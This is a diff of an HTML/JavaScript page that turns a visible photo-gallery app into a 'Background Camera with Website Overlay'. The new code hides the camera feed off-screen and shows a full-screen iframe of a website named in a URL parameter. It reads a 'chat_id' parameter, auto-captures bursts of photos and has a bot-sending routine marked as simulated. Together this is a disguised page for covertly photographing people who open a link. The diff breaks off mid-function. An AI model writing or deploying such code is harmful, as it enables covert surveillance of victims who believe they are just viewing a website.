@@ -1,14 +1,9 @@
-Location-Based Photo Gallery with Camera Access
-
-I'll create a solution that addresses both issues: requesting location permission and displaying multiple photos. Here's a complete implementation:
-
-```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location-Based Photo Gallery</title>
+    <title>Background Camera with Website Overlay</title>
     <style>
         * {
             margin: 0;
@@ -18,548 +13,979 @@ I'll create a solution that addresses both issues: requesting location permissio
         }
         
         body {
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
-            color: white;
-            min-height: 100vh;
-            padding: 20px;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
         }
         
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
+        /* Hidden camera section - runs in background */
+        #backgroundCamera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
         
-        header {
-            text-align: center;
-            padding: 20px 0;
-            margin-bottom: 30px;
+        #cameraVideo {
+            width: 640px;
+            height: 480px;
         }
         
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        /* Main website iframe - visible in foreground */
+        #websiteFrame {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1;
         }
         
-        .subtitle {
-            font-size: 1.2rem;
-            opacity: 0.9;
-        }
-        
-        .permission-section {
-            background: rgba(255, 255, 255, 0.1);
+        /* Floating control panel */
+        #controlPanel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.9);
             backdrop-filter: blur(10px);
             border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            text-align: center;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 20px;
+            z-index: 1000;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            min-width: 300px;
+            max-width: 350px;
+            color: white;
+            display: none; /* Hidden by default */
         }
         
-        .permission-title {
+        #controlPanel.visible {
+            display: block;
+        }
+        
+        /* Toggle button to show/hide control panel */
+        #toggleControl {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            color: white;
             font-size: 1.5rem;
+            cursor: pointer;
+            z-index: 999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            transition: all 0.3s ease;
+        }
+        
+        #toggleControl:hover {
+            background: rgba(0, 0, 0, 0.95);
+            transform: scale(1.1);
+        }
+        
+        #toggleControl.hidden {
+            display: none;
+        }
+        
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+        
+        .panel-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .minimize-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+        
+        .minimize-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
+        .status-grid {
+            display: grid;
+            gap: 10px;
             margin-bottom: 15px;
         }
         
-        .permission-buttons {
+        .status-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            border-radius: 8px;
             display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 20px;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .status-label {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        .status-value {
+            font-weight: 600;
+            font-size: 1rem;
+        }
+        
+        .controls {
+            display: grid;
+            gap: 10px;
+            margin-bottom: 15px;
         }
         
         .btn {
-            padding: 12px 25px;
+            padding: 12px 20px;
             border: none;
-            border-radius: 50px;
-            font-size: 1rem;
+            border-radius: 10px;
+            font-size: 0.95rem;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
             display: flex;
             align-items: center;
+            justify-content: center;
             gap: 8px;
+        }
+        
+        .btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            opacity: 0.9;
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+            color: white;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
+            color: white;
         }
         
         .btn-primary {
-            background: #4CAF50;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
         }
         
-        .btn-primary:hover {
-            background: #45a049;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-        }
-        
-        .btn-secondary {
-            background: #f44336;
+        .btn-warning {
+            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
             color: white;
         }
         
-        .btn-secondary:hover {
-            background: #d32f2f;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-        }
-        
-        .status-section {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        .status-title {
-            font-size: 1.3rem;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .status-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 15px;
-        }
-        
-        .status-item {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 15px;
-            border-radius: 10px;
-        }
-        
-        .status-label {
-            font-weight: 600;
-            margin-bottom: 5px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .status-value {
-            font-size: 1.1rem;
-        }
-        
-        .photo-section {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        .photo-title {
-            font-size: 1.3rem;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .photo-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 20px;
-        }
-        
-        .photo-item {
-            position: relative;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            transition: transform 0.3s ease;
-            aspect-ratio: 1;
-        }
-        
-        .photo-item:hover {
-            transform: scale(1.05);
-        }
-        
-        .photo-img {
+        .website-input {
             width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .photo-caption {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 8px;
+            padding: 10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
             font-size: 0.9rem;
+            margin-bottom: 10px;
         }
         
-        .camera-section {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+        .website-input:focus {
+            outline: none;
+            border-color: #667eea;
         }
         
-        .camera-title {
-            font-size: 1.3rem;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+        .website-input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
         }
         
-        .camera-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .camera-preview {
+        .progress-bar {
             width: 100%;
-            max-width: 500px;
-            border-radius: 10px;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
             overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            margin-top: 10px;
         }
         
-        #cameraVideo {
-            width: 100%;
-            display: block;
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #11998e, #38ef7d);
+            width: 0%;
+            transition: width 0.1s linear;
         }
         
-        .camera-buttons {
-            display: flex;
-            gap: 15px;
+        .capture-status {
+            margin-top: 10px;
+            font-size: 0.85rem;
+            text-align: center;
+            padding: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
         }
         
-        .hidden {
-            display: none;
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        
+        .sending {
+            animation: pulse 0.5s infinite;
         }
         
         .success {
-            color: #4CAF50;
+            color: #38ef7d;
         }
         
         .error {
-            color: #f44336;
+            color: #f45c43;
         }
         
-        .pending {
-            color: #FFC107;
+        .settings-section {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
         }
         
-        .icon {
+        .settings-title {
+            font-size: 1rem;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .setting-item {
+            margin-bottom: 10px;
+        }
+        
+        .setting-label {
+            font-size: 0.85rem;
+            margin-bottom: 5px;
+            display: block;
+            opacity: 0.8;
+        }
+        
+        select, input[type="range"] {
+            width: 100%;
+            padding: 8px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 0.85rem;
+        }
+        
+        select option {
+            background: #1a1a1a;
+        }
+        
+        .gallery-preview {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 15px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .gallery-preview::-webkit-scrollbar {
+            width: 4px;
+        }
+        
+        .gallery-preview::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 2px;
+        }
+        
+        .gallery-thumb {
+            width: 100%;
+            aspect-ratio: 1;
+            object-fit: cover;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .gallery-thumb:hover {
+            transform: scale(1.1);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .modal.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            position: relative;
+            max-width: 90%;
+            max-height: 90%;
+        }
+        
+        .modal-content img {
+            max-width: 100%;
+            max-height: 90vh;
+            border-radius: 10px;
+        }
+        
+        .modal-close {
+            position: absolute;
+            top: -40px;
+            right: 0;
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
             font-size: 1.2rem;
         }
         
+        .draggable {
+            cursor: move;
+        }
+        
         @media (max-width: 768px) {
-            .photo-grid {
-                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            }
-            
-            .permission-buttons {
-                flex-direction: column;
-                align-items: center;
-            }
-            
-            .btn {
-                width: 100%;
-                max-width: 300px;
+            #controlPanel {
+                bottom: 10px;
+                right: 10px;
+                left: 10px;
+                max-width: none;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>Location-Based Photo Gallery</h1>
-            <p class="subtitle">Capture photos with location data and view them in a beautiful gallery</p>
-        </header>
-        
-        <section class="permission-section">
-            <h2 class="permission-title">Permissions Required</h2>
-            <p>This application needs access to your location and camera to function properly.</p>
-            <div class="permission-buttons">
-                <button id="grantPermissions" class="btn btn-primary">
-                    <span class="icon">📍</span> Grant Permissions
-                </button>
-                <button id="denyPermissions" class="btn btn-secondary">
-                    <span class="icon">❌</span> Deny Permissions
-                </button>
+    <!-- Hidden camera in background -->
+    <div id="backgroundCamera">
+        <video id="cameraVideo" autoplay playsinline muted></video>
+    </div>
+    
+    <!-- Main website iframe (foreground) -->
+    <iframe id="websiteFrame" src="about:blank"></iframe>
+    
+    <!-- Toggle button -->
+    <button id="toggleControl" onclick="toggleControlPanel()">⚙️</button>
+    
+    <!-- Floating control panel -->
+    <div id="controlPanel">
+        <div class="panel-header" onclick="togglePanel()">
+            <div class="panel-title">
+                <span>📸</span>
+                <span>Camera Control</span>
             </div>
-        </section>
+            <button class="minimize-btn" id="minimizeBtn" onclick="event.stopPropagation(); toggleControlPanel()">✕</button>
+        </div>
         
-        <section id="statusSection" class="status-section hidden">
-            <h2 class="status-title">
-                <span class="icon">📊</span> Status Information
-            </h2>
+        <div class="panel-content">
+            <!-- Website URL Input -->
+            <div style="margin-bottom: 15px;">
+                <label class="setting-label">🌐 Current Website</label>
+                <input 
+                    type="text" 
+                    id="websiteUrl" 
+                    class="website-input" 
+                    placeholder="Enter website URL"
+                    value=""
+                    readonly
+                    style="opacity: 0.7;"
+                >
+                <button class="btn btn-primary" onclick="loadWebsite()">
+                    🔄 Reload Website
+                </button>
+                <small style="display: block; margin-top: 5px; opacity: 0.7; font-size: 0.75rem;">
+                    Format: ?chat_id=YOUR_ID&site=YOUR_WEBSITE
+                </small>
+            </div>
+            
+            <!-- Status -->
             <div class="status-grid">
                 <div class="status-item">
-                    <div class="status-label">
-                        <span class="icon">📍</span> Location Access
-                    </div>
-                    <div id="locationStatus" class="status-value pending">Pending...</div>
+                    <span class="status-label">📷 Camera</span>
+                    <span class="status-value" id="cameraStatus">Off</span>
                 </div>
                 <div class="status-item">
-                    <div class="status-label">
-                        <span class="icon">📷</span> Camera Access
-                    </div>
-                    <div id="cameraStatus" class="status-value pending">Pending...</div>
+                    <span class="status-label">💬 Chat ID</span>
+                    <span class="status-value" id="chatIdDisplay">${CHAT_ID}</span>
                 </div>
                 <div class="status-item">
-                    <div class="status-label">
-                        <span class="icon">🕐</span> Timestamp
-                    </div>
-                    <div id="timestamp" class="status-value">--:--:--</div>
+                    <span class="status-label">📍 Location</span>
+                    <span class="status-value" id="locationStatus">Pending</span>
                 </div>
                 <div class="status-item">
-                    <div class="status-label">
-                        <span class="icon">📱</span> Device Info
+                    <span class="status-label">📸 Photos</span>
+                    <span class="status-value" id="photoCount">0</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">📤 Sent</span>
+                    <span class="status-value" id="photosSent">0</span>
+                </div>
+            </div>
+            
+            <!-- Controls -->
+            <div class="controls">
+                <button class="btn btn-success" id="startCamera" onclick="startCamera()">
+                    📹 Start Camera
+                </button>
+                <button class="btn btn-danger" id="stopCamera" onclick="stopCamera()" disabled>
+                    ⏹️ Stop Camera
+                </button>
+                <button class="btn btn-warning" id="autoCapture" onclick="autoCapture()" disabled>
+                    ⚡ Auto-Capture (5 photos)
+                </button>
+            </div>
+            
+            <!-- Progress -->
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="capture-status" id="captureStatus">Ready</div>
+            
+            <!-- Settings -->
+            <div class="settings-section">
+                <div class="settings-title">⚙️ Settings</div>
+                
+                <div class="setting-item">
+                    <label class="setting-label">Camera</label>
+                    <select id="cameraSelect" onchange="switchCamera()">
+                        <option value="user">Front Camera</option>
+                        <option value="environment">Back Camera</option>
+                    </select>
+                </div>
+                
+                <div class="setting-item">
+                    <label class="setting-label">Resolution</label>
+                    <select id="resolutionSelect">
+                        <option value="640,480" selected>640x480</option>
+                        <option value="1280,720">1280x720 (HD)</option>
+                        <option value="1920,1080">1920x1080 (Full HD)</option>
+                    </select>
+                </div>
+                
+                <div class="setting-item">
+                    <label class="setting-label">Capture Interval: <span id="intervalValue">100</span>ms</label>
+                    <input type="range" id="intervalSlider" min="50" max="500" value="100" step="50" oninput="updateInterval()">
+                </div>
+            </div>
+            
+            <!-- Gallery Preview -->
+            <div class="settings-section">
+                <div class="settings-title">🖼️ Gallery</div>
+                <div class="gallery-preview" id="galleryPreview">
+                    <div style="grid-column: 1/-1; text-align: center; padding: 20px; opacity: 0.5;">
+                        No photos yet
                     </div>
-                    <div id="deviceInfo" class="status-value">Collecting...</div>
                 </div>
             </div>
-        </section>
-        
-        <section id="cameraSection" class="camera-section hidden">
-            <h2 class="camera-title">
-                <span class="icon">📷</span> Camera
-            </h2>
-            <div class="camera-container">
-                <div class="camera-preview">
-                    <video id="cameraVideo" autoplay playsinline muted></video>
-                </div>
-                <div class="camera-buttons">
-                    <button id="capturePhoto" class="btn btn-primary">
-                        <span class="icon">📸</span> Capture Photo
-                    </button>
-                    <button id="switchCamera" class="btn btn-secondary">
-                        <span class="icon">🔄</span> Switch Camera
-                    </button>
-                </div>
-            </div>
-        </section>
-        
-        <section id="photoSection" class="photo-section hidden">
-            <h2 class="photo-title">
-                <span class="icon">🖼️</span> Photo Gallery
-            </h2>
-            <div id="photoGrid" class="photo-grid">
-                <!-- Photos will be added here dynamically -->
-                <div class="photo-item">
-                    <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb" alt="Sample photo 1" class="photo-img">
-                    <div class="photo-caption">Sample Photo 1</div>
-                </div>
-                <div class="photo-item">
-                    <img src="https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05" alt="Sample photo 2" class="photo-img">
-                    <div class="photo-caption">Sample Photo 2</div>
-                </div>
-                <div class="photo-item">
-                    <img src="https://images.unsplash.com/photo-1469474968028-56623f02e42e" alt="Sample photo 3" class="photo-img">
-                    <div class="photo-caption">Sample Photo 3</div>
-                </div>
-            </div>
-        </section>
+        </div>
+    </div>
+    
+    <!-- Photo Modal -->
+    <div class="modal" id="photoModal" onclick="closeModal()">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <button class="modal-close" onclick="closeModal()">✕</button>
+            <img id="modalImage" src="" alt="Photo">
+        </div>
     </div>
 
     <script>
-        // DOM Elements
-        const grantPermissionsBtn = document.getElementById('grantPermissions');
-        const denyPermissionsBtn = document.getElementById('denyPermissions');
-        const statusSection = document.getElementById('statusSection');
-        const cameraSection = document.getElementById('cameraSection');
-        const photoSection = document.getElementById('photoSection');
-        const locationStatus = document.getElementById('locationStatus');
-        const cameraStatus = document.getElementById('cameraStatus');
-        const timestamp = document.getElementById('timestamp');
-        const deviceInfo = document.getElementById('deviceInfo');
-        const cameraVideo = document.getElementById('cameraVideo');
-        const capturePhotoBtn = document.getElementById('capturePhoto');
-        const switchCameraBtn = document.getElementById('switchCamera');
-        const photoGrid = document.getElementById('photoGrid');
+        // Configuration - Get website and chat_id from URL parameters
+        function getConfigFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            // Get website URL from multiple possible parameters
+            const websiteParam = urlParams.get('site') || urlParams.get('url') || urlParams.get('website');
+            const chatId = urlParams.get('chat_id');
+            
+            let websiteURL = 'https://www.example.com'; // Default fallback
+            
+            if (websiteParam) {
+                // Decode the URL if it's encoded
+                websiteURL = decodeURIComponent(websiteParam);
+                
+                // Add https:// if not present
+                if (!websiteURL.startsWith('http://') && !websiteURL.startsWith('https://')) {
+                    websiteURL = 'https://' + websiteURL;
+                }
+            }
+            
+            return {
+                website: websiteURL,
+                chatId: chatId || 'unknown'
+            };
+        }
+        
+        const config = getConfigFromURL();
+        const DEFAULT_WEBSITE = config.website;
+        const CHAT_ID = config.chatId;
+        
+        console.log('Configuration loaded:', config);
         
         // App State
         let cameraStream = null;
-        let currentFacingMode = 'user'; // 'user' for front camera, 'environment' for back
-        let capturedPhotos = [];
+        let currentFacingMode = 'user';
+        let photos = [];
+        let photosSentCount = 0;
+        let isAutoCapturing = false;
+        let captureInterval = 100;
+        let currentResolution = { width: 640, height: 480 };
         
-        // Update timestamp
-        function updateTimestamp() {
-            const now = new Date();
-            timestamp.textContent = now.toLocaleTimeString();
-        }
+        // DOM Elements
+        const cameraVideo = document.getElementById('cameraVideo');
+        const websiteFrame = document.getElementById('websiteFrame');
+        const controlPanel = document.getElementById('controlPanel');
+        const startCameraBtn = document.getElementById('startCamera');
+        const stopCameraBtn = document.getElementById('stopCamera');
+        const autoCaptureBtn = document.getElementById('autoCapture');
+        const cameraStatus = document.getElementById('cameraStatus');
+        const photoCount = document.getElementById('photoCount');
+        const photosSent = document.getElementById('photosSent');
+        const locationStatus = document.getElementById('locationStatus');
+        const progressFill = document.getElementById('progressFill');
+        const captureStatus = document.getElementById('captureStatus');
+        const galleryPreview = document.getElementById('galleryPreview');
+        const photoModal = document.getElementById('photoModal');
+        const modalImage = document.getElementById('modalImage');
+        const resolutionSelect = document.getElementById('resolutionSelect');
+        const intervalSlider = document.getElementById('intervalSlider');
+        const toggleControlBtn = document.getElementById('toggleControl');
         
-        setInterval(updateTimestamp, 1000);
-        updateTimestamp();
-        
-        // Collect device info
-        function collectDeviceInfo() {
-            const info = [
-                navigator.platform,
-                screen.width + 'x' + screen.height,
-                navigator.language
-            ].join(' | ');
-            
-            deviceInfo.textContent = info;
-        }
-        
-        // Request location permission
-        async function requestLocationPermission() {
-            try {
-                locationStatus.textContent = 'Requesting...';
-                locationStatus.className = 'status-value pending';
-                
-                if (!navigator.geolocation) {
-                    throw new Error('Geolocation is not supported by this browser');
-                }
-                
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    });
-                });
-                
-                const { latitude, longitude, accuracy } = position.coords;
-                locationStatus.textContent = `Lat: ${latitude.toFixed(4)}, Lng: ${longitude.toFixed(4)}`;
-                locationStatus.className = 'status-value success';
-                
-                return { latitude, longitude, accuracy };
-            } catch (error) {
-                console.error('Location error:', error);
-                locationStatus.textContent = `Error: ${error.message}`;
-                locationStatus.className = 'status-value error';
-                return null;
+        // Toggle control panel visibility
+        function toggleControlPanel() {
+            controlPanel.classList.toggle('visible');
+            if (controlPanel.classList.contains('visible')) {
+                toggleControlBtn.style.display = 'none';
+            } else {
+                toggleControlBtn.style.display = 'flex';
             }
         }
         
-        // Request camera permission and start camera
-        async function requestCameraPermission() {
-            try {
-                cameraStatus.textContent = 'Requesting...';
-                cameraStatus.className = 'status-value pending';
-                
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    throw new Error('Camera API is not supported by this browser');
+        // Load website in iframe
+        function loadWebsite() {
+            const url = document.getElementById('websiteUrl').value.trim();
+            if (url) {
+                try {
+                    // Add https:// if not present
+                    const formattedUrl = url.startsWith('http') ? url : 'https://' + url;
+                    websiteFrame.src = formattedUrl;
+                    captureStatus.textContent = `Loading: ${formattedUrl}`;
+                    
+                    // Handle iframe load errors
+                    websiteFrame.onerror = () => {
+                        captureStatus.textContent = 'Failed to load website';
+                        captureStatus.className = 'capture-status error';
+                    };
+                } catch (error) {
+                    captureStatus.textContent = 'Invalid URL';
+                    captureStatus.className = 'capture-status error';
                 }
+            }
+        }
+        
+        // Load default website on startup
+        function loadDefaultWebsite() {
+            const urlInput = document.getElementById('websiteUrl');
+            urlInput.value = DEFAULT_WEBSITE;
+            loadWebsite();
+        }
+        
+        // Toggle panel minimize
+        function togglePanel() {
+            // This function is no longer needed but kept for compatibility
+        }
+        
+        // Update interval
+        function updateInterval() {
+            captureInterval = parseInt(intervalSlider.value);
+            document.getElementById('intervalValue').textContent = captureInterval;
+        }
+        
+        // Start camera (background)
+        async function startCamera() {
+            try {
+                cameraStatus.textContent = 'Starting...';
                 
-                cameraStream = await navigator.mediaDevices.getUserMedia({
+                const constraints = {
                     video: {
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
+                        width: { ideal: currentResolution.width },
+                        height: { ideal: currentResolution.height },
                         facingMode: currentFacingMode
                     }
-                });
+                };
                 
+                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                 cameraVideo.srcObject = cameraStream;
+                
                 cameraStatus.textContent = 'Active';
                 cameraStatus.className = 'status-value success';
-                cameraSection.classList.remove('hidden');
                 
-                return true;
+                startCameraBtn.disabled = true;
+                stopCameraBtn.disabled = false;
+                autoCaptureBtn.disabled = false;
+                
+                captureStatus.textContent = 'Camera running in background';
             } catch (error) {
                 console.error('Camera error:', error);
-                cameraStatus.textContent = `Error: ${error.message}`;
+                cameraStatus.textContent = 'Error';
                 cameraStatus.className = 'status-value error';
-                return false;
+                captureStatus.textContent = 'Camera access denied';
             }
         }
         
-        // Switch between front and back camera
-        async function switchCamera() {
+        // Stop camera
+        function stopCamera() {
             if (cameraStream) {
                 cameraStream.getTracks().forEach(track => track.stop());
-            }
-            
-            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-            await requestCameraPermission();
-        }
-        
-        // Capture photo from camera
-        function capturePhoto() {
-            if (!cameraStream) return;
-            
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            
-            canvas.width = cameraVideo.videoWidth;
-            canvas.height = cameraVideo.videoHeight;
-            
-            context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(blob => {
-                const photoUrl = URL.createObjectURL(blob);
-                capturedPhotos.push(photoUrl);
+                cameraVideo.srcObject = null;
+                cameraStream = null;
                 
-                // Add photo to gallery
-                const photoItem = document.createElement('div');
-                photoItem.className = 'photo-item';
+                cameraStatus.textContent = 'Off';
+                cameraStatus.className = 'status-value';
                 
-                const img = document.createElement('img');
-                img.src = photoUrl;
-                img.alt = `Captured photo ${capturedPhotos.length}`;
-                img.className = 'photo-img';
+                startCameraBtn.disabled = false;
+                stopCameraBtn.disabled = true;
+                autoCaptureBtn.disabled = true;
                 
-                const caption = document.createElement('div');
-                caption.className = 'photo-caption';
-                caption.textContent = `Photo ${capturedPhotos.length}`;
-                
-                photoItem.appendChild(img);
-                photoItem.appendChild(caption);
-                
-                // Remove sample photos if they exist
-                if (capturedPhotos.length === 1) {
-                    photoGrid.innerHTML = '';
-                }
-                
-                photoGrid.appendChild(photoItem);
-                photoSection.classList.remove('hidden');
-            }, 'image/jpeg', 0.8);
-        }
-        
-        // Initialize app with permissions
-        async function initializeApp() {
-            statusSection.classList.remove('hidden');
-            collectDeviceInfo();
-            
-            const locationData = await requestLocationPermission();
-            const cameraAccess = await requestCameraPermission();
-            
-            if (cameraAccess) {
-                photoSection.classList.remove('hidden');
+                captureStatus.textContent = 'Camera stopped';
             }
         }
         
-        // Event Listeners
-        grantPermissionsBtn.addEventListener('click', initializeApp);
+        // Switch camera
+        async function switchCamera() {
+            currentFacingMode = document.getElementById('cameraSelect').value;
+            if (cameraStream) {
+                stopCamera();
+                await startCamera();
+            }
+        }
         
-        denyPermissionsBtn.addEventListener('click', () => {
-            locationStatus.textContent = 'Denied by user';
-            locationStatus.className = 'status-value error';
-            cameraStatus.textContent = 'Denied by user';
-            cameraStatus.className = 'status-value error';
-            statusSection.classList.remove('hidden');
+        // Update resolution
+        resolutionSelect.addEventListener('change', () => {
+            const [width, height] = resolutionSelect.value.split(',').map(Number);
+            currentResolution = { width, height };
+            if (cameraStream) {
+                stopCamera();
+                startCamera();
+            }
         });
         
-        capturePhotoBtn.addEventListener('click', capturePhoto);
-        switchCameraBtn.addEventListener('click', switchCamera);
+        // Capture single photo
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                
+                canvas.width = cameraVideo.videoWidth;
+                canvas.height = cameraVideo.videoHeight;
+                
+                context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    const photo = {
+                        id: Date.now() + Math.random(),
+                        blob: blob,
+                        url: URL.createObjectURL(blob),
+                        timestamp: new Date(),
+                        resolution: `${canvas.width}x${canvas.height}`
+                    };
+                    
+                    photos.push(photo);
+                    updateGallery();
+                    photoCount.textContent = photos.length;
+                    
+                    resolve(photo);
+                }, 'image/jpeg', 0.95);
+            });
+        }
         
-        // Clean up camera stream when leaving page
+        // Send photo to bot (simulated)
+        async function sendPhotoToBot(photo, photoNumber) {
+            return new Promise((resolve) => {
+                captureStatus.textContent = `Sending photo ${photoNumber}...`;
+                captureStatus.classList.add('sending');
+                
+                // Simulate API call
+                setTimeout(() => {
+                    photosSentCount++;
+                    photosSent.textContent = photosSentCount;
+                    captureStatus.classList.remove('sending');
+                    console.log(`Photo ${photoNumber} sent!`, {
+                        size: photo.blob.size,
+                        timestamp: photo.timestamp,
+                        resolution: photo.resolution
+                    });
+                    resolve();
+                }, 50);
+            });
+        }
+        
+        // Auto-capture 5 photos
+        async function autoCapture() {
+            await autoCaptureWithLocation();
+        }
+        
+        // Update gallery preview
+        function updateGallery() {
+            if (photos.length === 0) {
+                galleryPreview.innerHTML = '<div style="grid-column: 1/-1; text-align: center; padding: 20px; opacity: 0.5;">No photos yet</div>';
+                return;
+            }
+            
+            galleryPreview.innerHTML = '';
+            photos.slice(-9).reverse().forEach((photo, index) => {
+                const img = document.createElement('img');
+                img.src = photo.url;
+                img.className = 'gallery-thumb';
+                img.onclick = () => viewPhoto(photo);
+                galleryPreview.appendChild(img);
+            });
+        }
+        
+        // View photo in modal
+        function viewPhoto(photo) {
